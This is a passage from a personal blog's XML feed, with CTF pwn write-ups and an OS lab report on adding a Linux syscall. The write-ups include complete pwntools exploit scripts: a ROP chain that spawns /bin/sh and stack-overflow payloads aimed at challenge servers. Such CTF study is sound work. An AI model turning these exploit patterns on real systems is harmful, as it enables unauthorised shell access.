class="hljs-string">&quot;new-pane&quot;</span>,<br>        <span class="hljs-string">&quot;-d&quot;</span>,<br>        <span class="hljs-string">&quot;right&quot;</span>,<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>        <span class="hljs-string">&quot;--&quot;</span>,<br>        <span class="hljs-string">&quot;bash&quot;</span>,<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>    ]<br><br>exe = ELF(<span class="hljs-string">&#x27;./attachment&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">conn</span>():<br>    <span class="hljs-keyword">if</span> args.LOCAL:<br>        <span class="hljs-comment"># io = process(&quot;./attachment&quot;)</span><br>        io = process([exe.path])<br>    <span class="hljs-keyword">elif</span> args.GDB:<br>        <span class="hljs-comment"># io = gdb.debug(&quot;./attachment&quot;, &quot;b *start&quot;)</span><br>        io = gdb.debug([exe.path])<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># node2.anna.nssctf.cn:28379</span><br>        io = remote(<span class="hljs-string">&quot;node2.anna.nssctf.cn&quot;</span>, <span class="hljs-number">28266</span>)<br>    <span class="hljs-keyword">return</span> io<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">global</span> io<br>    io = conn()<br>    pop_5 = <span class="hljs-number">0x401017</span>  <span class="hljs-comment"># rsi rdi rbx r13 r15</span><br>    xchg_rax_r13 = <span class="hljs-number">0x40100C</span><br>    addr_syscall = <span class="hljs-number">0x401077</span><br>    <span class="hljs-comment"># addr_bin_sh = 0x7fffffffd7a0</span><br>    ret = <span class="hljs-number">0x401013</span><br>    addr_data = <span class="hljs-number">0x402000</span><br>    xor_rdx_rdx = <span class="hljs-number">0x401021</span><br>    <span class="hljs-comment"># payload = p64(pop_5) + p64(ret) + p64(0) + p64(addr_bin_sh) + p64(0) + p64(59) + p64(xchg_rax_r13) + p64(addr_syscall) + b&#x27;/bin/sh\x00&#x27;</span><br>    payload = p64(ret) + p64(pop_5) + p64(addr_data) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xdeadbeef</span>) + p64(<span class="hljs-number">0</span>) + p64(ret) + p64(xchg_rax_r13) + p64(ret) + p64(addr_syscall) <br>    payload += p64(ret) + p64(pop_5) + p64(<span class="hljs-number">0</span>) + p64(addr_data) + p64(<span class="hljs-number">0xdeadbeef</span>) + p64(<span class="hljs-number">59</span>) + p64(ret) + p64(xchg_rax_r13) + p64(ret) + p64(xor_rdx_rdx) + p64(addr_syscall)<br><br><br><br>    <span class="hljs-comment"># pause()</span><br>    io.sendline(payload)<br><br>    <span class="hljs-comment"># pause()</span><br>    io.sendline(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>    io.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h1 id="my-vm"><a href="#my-vm" class="headerlink" title="my_vm"></a>my_vm</h1><blockquote><p><a href="https://www.cnblogs.com/CH13hh/p/18603549">VMpwn总结 - CH13hh - 博客园</a></p></blockquote><p><code>scanf()</code>占位符<br><code>%hd</code> short型：2字节</p><p><code>getchar()</code> 从标准输入读取单个字符</p><blockquote><p>[!tip] getchar()的作用<br>scanf的行为：<br>不会处理输入缓冲区的换行符或空白符，<br>这些字符会残留在缓冲区中，<br>而使用getchar()可用来清理换行符<code>\n</code>(残留字符)</p></blockquote><p><img src="/2024/10/29/hello-world/p/file-20250307143623331.png"><br>有canary、无pie</p><p>这题需要清晰地逆向<br><code>memory</code> ：在bss段定义的一大段内存，每个单位4字节</p><p><code>int reg[10]</code> 也是一段bss内存空间 代表寄存器</p>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>elf文件段</title>
    <link href="/2025/03/02/elf%E6%96%87%E4%BB%B6%E6%AE%B5/"/>
    <url>/2025/03/02/elf%E6%96%87%E4%BB%B6%E6%AE%B5/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>使用pwntools时的语法注意点</title>
    <link href="/2025/03/02/%E4%BD%BF%E7%94%A8pwntools%E6%97%B6%E7%9A%84%E8%AF%AD%E6%B3%95%E6%B3%A8%E6%84%8F%E7%82%B9/"/>
    <url>/2025/03/02/%E4%BD%BF%E7%94%A8pwntools%E6%97%B6%E7%9A%84%E8%AF%AD%E6%B3%95%E6%B3%A8%E6%84%8F%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<p>p32不能操作负数<br>需要和负数 与 上 1，转化为无符号数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">var_v2 = -<span class="hljs-number">557122643</span> &amp; <span class="hljs-number">0xFFFFFFFF</span>  <span class="hljs-comment"># 32位 8个F （4字节）</span><br>p32(var_v2)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>VMVare连网</title>
    <link href="/2025/03/01/VMVare%E8%BF%9E%E7%BD%91/"/>
    <url>/2025/03/01/VMVare%E8%BF%9E%E7%BD%91/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>OS实验一</title>
    <link href="/2025/03/01/OS%E5%AE%9E%E9%AA%8C%E4%B8%80/"/>
    <url>/2025/03/01/OS%E5%AE%9E%E9%AA%8C%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<table><thead><tr><th>实验内容：</th></tr></thead><tbody><tr><td>1.     在Linux&#x2F;OpenEuler&#x2F;OpenKylin系统中，增加一个系统调用&#x2F;或内核模块，鼓励程序逻辑的多样化<br><br>2.     撰写一个应用测试程序调用该系统调用&#x2F;测试该内核模块<br><br>3.     使用trace&#x2F;ptrace&#x2F;strace，或类似的系统跟踪工具来对该测试程序进行跟踪调试<br><br>4.     附加：在指定的国产OS上，安装一个KVM，或Xen，再装一个guestOS，体会一下，或学习使用容器。</td></tr></tbody></table><hr><p>任务4交由队友完成</p><h1 id="在Linux系统中增加一个系统调用"><a href="#在Linux系统中增加一个系统调用" class="headerlink" title="在Linux系统中增加一个系统调用"></a>在Linux系统中增加一个系统调用</h1><blockquote><p>参考资料：<br>《操作系统概念》原书第9版<br> <a href="https://zhuanlan.zhihu.com/p/487648323">给 Linux 内核添加自己定义的系统调用 - 知乎</a><br> <a href="https://blog.csdn.net/qq_41175905/article/details/80529245">操作系统作业：给linux系统增加一个系统调用_为linux内核增加系统调用systest( )-CSDN博客</a></p></blockquote><p><strong>系统调用</strong>是操作系统提供给应用程序的接口，是由操作系统开发者定义在内核之中。所以我们可以自己编译内核并且注册自己的系统调用</p><p>添加系统调用需要在内核源码中操作，所以需要先下载一份内核源码，然后注册好系统调用之后把自己修改好的内核加载到系统中。</p><hr><p>PS：由于我的虚拟机性能非常拉跨，平时对Linux的使用主要是wsl而非VMVare，所以这次使用也遇到并解决了一些使用过程中的问题<br>VMVare联网问题<br><a href="https://www.cnblogs.com/whc1/p/17605428.html">VMware使用时无法连接网络的问题 - sunny-JJ - 博客园</a></p><p>鼠标消失解决方法<br><a href="https://blog.csdn.net/u012915636/article/details/137169474">QA：ubuntu22.04.4桌面版虚拟机鼠标丢失的解决方法_虚拟机鼠标不见了怎么办-CSDN博客</a></p><p>在VMVare中使用主机VPN<br><a href="https://blog.csdn.net/nomoremorphine/article/details/138738065">VMware Ubuntu虚拟 机 使用主机VPN 配置（简单、可行）-CSDN博客</a></p><hr><h2 id="第1步-下载一份内核源码"><a href="#第1步-下载一份内核源码" class="headerlink" title="第1步 下载一份内核源码"></a>第1步 下载一份内核源码</h2><p><img src="/2024/10/29/hello-world/0250301160352064.png"></p><p>切换到root用户<br>查看内核版本<br><img src="/2024/10/29/hello-world/0250301162335707.png"><br>可见，<br>我采用的系统是Ubuntu22.04.1<br>内核版本是6.5.0-14-generic<br>体系结构为x86_64</p><hr><p>安装vim（编辑器）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> apt-get install vim<br></code></pre></td></tr></table></figure><hr><p>查看当前的内核版本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">uname</span> -r<br></code></pre></td></tr></table></figure><hr><hr><p>下载Linux内核<br><img src="/2024/10/29/hello-world/0250301201645726.png"><br><img src="/2024/10/29/hello-world/0250301201718180.png"></p><p>移动文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mv</span> linux-6.5.tar.xz /usr/src/<br></code></pre></td></tr></table></figure><p><img src="/2024/10/29/hello-world/0250301202429842.png"></p><p>解压缩</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">tar -xvf linux-6.5.tar.xz<br></code></pre></td></tr></table></figure><p>解压缩完成<br><img src="/2024/10/29/hello-world/0250301202842877.png"><br>好了，已经成功一半哩（）</p><hr><h2 id="第2步-注册系统调用号"><a href="#第2步-注册系统调用号" class="headerlink" title="第2步 注册系统调用号"></a>第2步 注册系统调用号</h2><p>在Linux中，每个系统调用都被赋予了一个系统调用号。这样，通过这个独一无二的号就可以关联系统调用！<br><strong>内核</strong>记录了所有已注册过的系统调用号，存储在<code>sys_call_table</code>中<br>所以，我们首先要注册一个系统调用号：在系统调用表中填入对应的信息</p><p>在<code>x86_64</code>体系结构中，这个表在<code>arch/x86/entry/syscalls/syscall_64.tbl</code>中定义</p><p>系统调用表的每一项的组成：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">number</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">abi</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">entry</span> <span class="hljs-attr">point</span>&gt;</span><br><br>系统调用号 ABI 系统调用名字 系统调用在内核的接口函数<br></code></pre></td></tr></table></figure><hr><p>注：要用sudo才有修改权限<br><img src="/2024/10/29/hello-world/0250301205910617.png"><br>在<code>syscall_64.tbl</code>中添加如下：<br><img src="/2024/10/29/hello-world/0250301205314919.png"></p><p>OK了，现在下一步</p><hr><h2 id="第3步-声明系统调用函数原型"><a href="#第3步-声明系统调用函数原型" class="headerlink" title="第3步 声明系统调用函数原型"></a>第3步 声明系统调用函数原型</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> /usr/src/linux-6.5/arch/x86/include/asm/<br><span class="hljs-built_in">sudo</span> vim syscalls.h<br></code></pre></td></tr></table></figure><p>添加：</p><figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs h">asmlinkage <span class="hljs-type">long</span> <span class="hljs-title function_">sys_hello_system</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br></code></pre></td></tr></table></figure><p><img src="/2024/10/29/hello-world/0250301211716868.png"></p><hr><h2 id="第4步-添加系统调用函数的定义"><a href="#第4步-添加系统调用函数的定义" class="headerlink" title="第4步 添加系统调用函数的定义"></a>第4步 添加系统调用函数的定义</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> /usr/src/linux-6.5/kernel<br><span class="hljs-built_in">sudo</span> vim sys.c<br></code></pre></td></tr></table></figure><p>在末尾加入函数声明：(不要有中文字符)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">SYSCALL_DEFINE0(hello_system)&#123;<br>    printk(<span class="hljs-string">&quot;Hello,system! Hello world!&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/10/29/hello-world/0250302111152782.png"></p><hr><h2 id="第5步-编译并安装此内核"><a href="#第5步-编译并安装此内核" class="headerlink" title="第5步 编译并安装此内核"></a>第5步 编译并安装此内核</h2><p>在此之前，需要先安装一些工具：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> apt-get install build-essential libncurses5-dev<br><span class="hljs-built_in">sudo</span> apt-get install git fakeroot build-essential ncurses-dev xz-utils libssl-dev bc flex libelf-dev bison dwarves<br></code></pre></td></tr></table></figure><p><img src="/2024/10/29/hello-world/0250301220934513.png"></p><p>前往linux-6-5目录：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> /usr/src/linux-6.5<br></code></pre></td></tr></table></figure><p>清理配置文件、编译残留</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> make mrproper<br></code></pre></td></tr></table></figure><p>配置内核</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> make clean<br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> make menuconfig<br></code></pre></td></tr></table></figure><p><img src="/2024/10/29/hello-world/0250301221210749.png"><br><img src="/2024/10/29/hello-world/0250301221654970.png"><br><img src="/2024/10/29/hello-world/0250301221718678.png"><br><img src="/2024/10/29/hello-world/0250301221902580.png"></p><p>要做的事：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># 禁用模块签名验证</span><br><span class="hljs-built_in">sudo</span> sed -i <span class="hljs-string">&#x27;s/CONFIG_MODULE_SIG=y/CONFIG_MODULE_SIG=n/&#x27;</span> .config<br><br><span class="hljs-comment"># 清空证书路径</span><br><span class="hljs-built_in">sudo</span> sed -i <span class="hljs-string">&#x27;s/CONFIG_SYSTEM_TRUSTED_KEYS=.*/CONFIG_SYSTEM_TRUSTED_KEYS=&quot;&quot;/&#x27;</span> .config<br><br><span class="hljs-comment"># 禁用吊销列表功能</span><br><span class="hljs-built_in">sudo</span> sed -i <span class="hljs-string">&#x27;s/CONFIG_SYSTEM_REVOCATION_KEYS=.*/CONFIG_SYSTEM_REVOCATION_KEYS=&quot;&quot;/&#x27;</span> .config<br><br><span class="hljs-comment"># 可选：禁用模块签名吊销检查</span><br><span class="hljs-built_in">sudo</span> sed -i <span class="hljs-string">&#x27;s/CONFIG_MODULE_SIG_ALL=y/CONFIG_MODULE_SIG_ALL=n/&#x27;</span> .config<br><br><span class="hljs-comment"># 重新编译</span><br><span class="hljs-built_in">sudo</span> make clean <br></code></pre></td></tr></table></figure><p>编译内核</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> make ARCH=x86_64 bzImage -j4<br><span class="hljs-built_in">sudo</span> make ARCH=x86_64 modules -j4<br></code></pre></td></tr></table></figure><p>安装内核模块</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> make ARCH=x86_64 modules_install<br></code></pre></td></tr></table></figure><p>安装内核</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> make ARCH=x86_64 install<br></code></pre></td></tr></table></figure><p>重启系统</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> reboot<br></code></pre></td></tr></table></figure><hr><h2 id="重启后换核"><a href="#重启后换核" class="headerlink" title="重启后换核"></a>重启后换核</h2><p><img src="/2024/10/29/hello-world/0250302143519448.png"></p><h2 id="验证新内核"><a href="#验证新内核" class="headerlink" title="验证新内核"></a>验证新内核</h2><hr><h2 id="UUID问题"><a href="#UUID问题" class="headerlink" title="UUID问题"></a>UUID问题</h2><p>查看根分区的UUID</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> blkid<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/dev/sda3: <span class="hljs-attribute">UUID</span>=<span class="hljs-string">&quot;ae8373b2-5980-4cca-a4f3-bb7630f25b9a&quot;</span> <span class="hljs-attribute">BLOCK_SIZE</span>=<span class="hljs-string">&quot;4096&quot;</span> <span class="hljs-attribute">TYPE</span>=<span class="hljs-string">&quot;ext4&quot;</span> <span class="hljs-attribute">PARTUUID</span>=<span class="hljs-string">&quot;c33c455f-21b4-4fff-a7c2-2cff5b5e4e1c&quot;</span><br><br></code></pre></td></tr></table></figure><p>mount命令确认挂载情况</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">mount | grep <span class="hljs-string">&quot; on / &quot;</span><br></code></pre></td></tr></table></figure><p>拿到正确的根分区UUID</p><p>检查并修改&#x2F;etc&#x2F;fstab</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> vim /etc/fstab<br></code></pre></td></tr></table></figure><p>列出所有已安装的内核映像及其版本号</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">dpkg --list | grep linux-image<br></code></pre></td></tr></table></figure><p>列出所有已安装的内核版本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">ls</span> /boot/vmlinuz*<br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> update-initramfs -c -k 6.5.0NewKernel<br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> update-grub<br><br><span class="hljs-built_in">sudo</span> reboot<br></code></pre></td></tr></table></figure><hr><h1 id="编写测试程序调用系统调用"><a href="#编写测试程序调用系统调用" class="headerlink" title="编写测试程序调用系统调用"></a>编写测试程序调用系统调用</h1><h2 id="找一个目录编写测试程序："><a href="#找一个目录编写测试程序：" class="headerlink" title="找一个目录编写测试程序："></a>找一个目录编写测试程序：</h2><p><code>testSyscall.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-type">long</span> res = <span class="hljs-number">0</span>;<br>res = syscall(<span class="hljs-number">548</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The syscall returned %ld\n&quot;</span>, res);<br><span class="hljs-keyword">if</span>(res == <span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;A successful system call!\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/10/29/hello-world/0250302111546751.png"></p><p>运行结果：<br><img src="/2024/10/29/hello-world/0250302111419681.png"></p><hr><h1 id="对测试程序跟踪调试"><a href="#对测试程序跟踪调试" class="headerlink" title="对测试程序跟踪调试"></a>对测试程序跟踪调试</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">strace testSyscall<br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">strace -e hello_system testSyscall<br></code></pre></td></tr></table></figure><blockquote><p>[!tip] 心得体会：<br>本次OS实验的编程并不复杂，困难的地方在于对于初次接触系统内核的我们来说，整个下载、编写、配置、编译、安装的过程非常繁琐，其中配置、编译、安装过程有着许多细节，很容易有报错，需要的是能耐着性子把它们一一解决，通过对操作系统内核源码的手动编写和编译安装，我对操作系统的内核和系统调用的认识从陌生变得熟悉，更加深刻得了解了操作系统的工作原理。</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>apoorvctf_wp</title>
    <link href="/2025/03/01/apoorvctf_wp/"/>
    <url>/2025/03/01/apoorvctf_wp/</url>
    
    <content type="html"><![CDATA[<h1 id="kogarashicafe-the-first"><a href="#kogarashicafe-the-first" class="headerlink" title="kogarashicafe - the first"></a>kogarashicafe - the first</h1><p>栈溢出 + 基本ROP</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br>context(arch=<span class="hljs-string">&#x27;i386&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-keyword">if</span> os.environ.get(<span class="hljs-string">&quot;ZELLIJ&quot;</span>) == <span class="hljs-string">&quot;0&quot;</span>:<br>    context.terminal = [<br>        <span class="hljs-string">&quot;zellij&quot;</span>,<br>        <span class="hljs-string">&quot;action&quot;</span>,<br>        <span class="hljs-string">&quot;new-pane&quot;</span>,<br>        <span class="hljs-string">&quot;-d&quot;</span>,<br>        <span class="hljs-string">&quot;right&quot;</span>,<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>        <span class="hljs-string">&quot;--&quot;</span>,<br>        <span class="hljs-string">&quot;bash&quot;</span>,<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>    ]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    addr_brew_coffee = <span class="hljs-number">0x0804856B</span><br>    offset = <span class="hljs-number">0x28</span> + <span class="hljs-number">4</span><br>    payload = <span class="hljs-string">b&quot;A&quot;</span> * offset + p32(addr_brew_coffee)<br>    <span class="hljs-comment"># r = process(&quot;./first_visit&quot;)</span><br>    r = remote(<span class="hljs-string">&quot;chals1.apoorvctf.xyz&quot;</span>, <span class="hljs-number">3001</span>)<br>    r.sendlineafter(<span class="hljs-string">&quot;Barista: &#x27;What will you have?&#x27;&quot;</span>, payload)    <br>    r.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>本地<br><img src="/2024/10/29/hello-world/file-20250301121431350.png"></p><p>远程<br><img src="/2024/10/29/hello-world/file-20250301121341165.png"></p><h1 id="kogarashicafe-the-secret"><a href="#kogarashicafe-the-secret" class="headerlink" title="kogarashicafe - the secret"></a>kogarashicafe - the secret</h1><p>典型的格式化字符串漏洞——泄漏内存</p><p><img src="/2024/10/29/hello-world/file-20250301141504988.png"><br><img src="/2024/10/29/hello-world/file-20250301141900173.png"></p><p><a href="https://www.qqxiuzi.cn/bianma/ascii.htm">ASCII编码转换，ASCII码在线查询工具</a></p><blockquote><p>关于字节 小端序 字长 还是需要再研究一下</p></blockquote><h1 id="kogarashicafe-the-forbidden-recipe"><a href="#kogarashicafe-the-forbidden-recipe" class="headerlink" title="kogarashicafe - the forbidden recipe"></a>kogarashicafe - the forbidden recipe</h1><p>非常简单的栈溢出，入门级签到题</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br>context(arch=<span class="hljs-string">&#x27;i386&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-keyword">if</span> os.environ.get(<span class="hljs-string">&quot;ZELLIJ&quot;</span>) == <span class="hljs-string">&quot;0&quot;</span>:<br>    context.terminal = [<br>        <span class="hljs-string">&quot;zellij&quot;</span>,<br>        <span class="hljs-string">&quot;action&quot;</span>,<br>        <span class="hljs-string">&quot;new-pane&quot;</span>,<br>        <span class="hljs-string">&quot;-d&quot;</span>,<br>        <span class="hljs-string">&quot;right&quot;</span>,<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>        <span class="hljs-string">&quot;--&quot;</span>,<br>        <span class="hljs-string">&quot;bash&quot;</span>,<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>    ]<br><br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    offset = <span class="hljs-number">0x20</span><br>    var_v2 = -<span class="hljs-number">557122643</span> &amp; <span class="hljs-number">0xFFFFFFFF</span><br>    var_v3 = <span class="hljs-number">12648243</span><br>    payload = <span class="hljs-string">b&#x27;A&#x27;</span> * offset + p32(var_v2) + p32(var_v3)<br>    <span class="hljs-comment"># nc chals1.apoorvctf.xyz 3002</span><br>    r = remote(<span class="hljs-string">&quot;chals1.apoorvctf.xyz&quot;</span>, <span class="hljs-number">3002</span>)<br>    <span class="hljs-comment"># r = process(&quot;./forbidden_recipe&quot;)</span><br>    r.sendlineafter(<span class="hljs-string">&quot;Barista: &#x27;I remember you... what will it be this time?&#x27;\n&quot;</span>, payload)<br>    r.interactive()<br>  <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>单周期CPU</title>
    <link href="/2025/02/28/%E5%8D%95%E5%91%A8%E6%9C%9FCPU/"/>
    <url>/2025/02/28/%E5%8D%95%E5%91%A8%E6%9C%9FCPU/</url>
    
